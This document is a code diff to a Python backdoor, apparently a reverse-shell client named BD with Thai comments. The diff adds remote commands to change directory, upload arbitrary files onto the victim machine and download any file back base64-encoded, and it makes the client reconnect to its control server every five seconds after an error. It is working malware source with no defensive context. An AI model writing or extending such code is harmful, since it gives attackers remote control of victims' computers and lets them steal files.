@@ -7,6 +7,8 @@ import json
 import sys
 import subprocess
 import time
+import os
+import base64
 
 
 class BD:
@@ -50,6 +52,44 @@ class BD:
             except ValueError:
                 continue
 
+    def change_directory_to(self, path):
+        try:
+            os.chdir(path)
+            return f"[+] Changed working directory to: {os.getcwd()}"
+        except Exception as e:
+            return f"[-] Change directory error: {str(e)}"
+        
+    
+    def download_file(self, path):
+        try:
+            # มีการตรวจสอบนามสกุลไฟล์
+            if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
+                # สำหรับไฟล์รูปภาพ ใช้ binary mode
+                with open(path, "rb") as file:
+                    image_data = file.read()
+                return base64.b64encode(image_data).decode()
+            else:
+                # สำหรับไฟล์ทั่วไป
+                with open(path, "rb") as file:
+                    return base64.b64encode(file.read()).decode()
+        except Exception as e:
+            return f"[-] Read file error: {str(e)}"
+
+    def up_file(self, path, content):
+        try:
+            # มีการตรวจสอบนามสกุลไฟล์
+            if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
+                # สำหรับไฟล์รูปภาพ ใช้ binary mode
+                with open(path, "wb") as file:
+                    file.write(base64.b64decode(content))
+            else:
+                # สำหรับไฟล์ทั่วไป
+                with open(path, "wb") as file:
+                    file.write(base64.b64decode(content))
+            return "[+] Upload successful"
+        except Exception as e:
+            return f"[-] Write file error: {str(e)}"
+
     def run_cmd(self):
         while True:
             try:
@@ -59,6 +99,15 @@ class BD:
                 if cmd[0] == "exit":
                     self.connection.close()
                     sys.exit()
+
+                elif cmd[0] == "cd" and len(cmd) > 1:
+                    cmd_result = self.change_directory_to(cmd[1])
+
+                elif cmd[0] == "upload" and len(cmd) > 2:
+                    cmd_result = self.up_file(cmd[1], cmd[2])
+
+                elif cmd[0] == "download" and len(cmd) > 1:
+                    cmd_result = self.download_file(cmd[1])
                 
                 else:
                     cmd_result = self.execute_sys_cmd(cmd)
@@ -79,7 +128,7 @@ if __name__ == "__main__":
                 server_bd.run_cmd()
             except Exception as e:
                 print(f"[-] Error: {str(e)}")
-                time.sleep(10)  # รอ 10 วินาทีก่อนลองเชื่อม Server ใหม่
+                time.sleep(5)  # รอ 5 วินาทีก่อนลองเชื่อม Server ใหม่
     except KeyboardInterrupt:
         sys.exit()
 
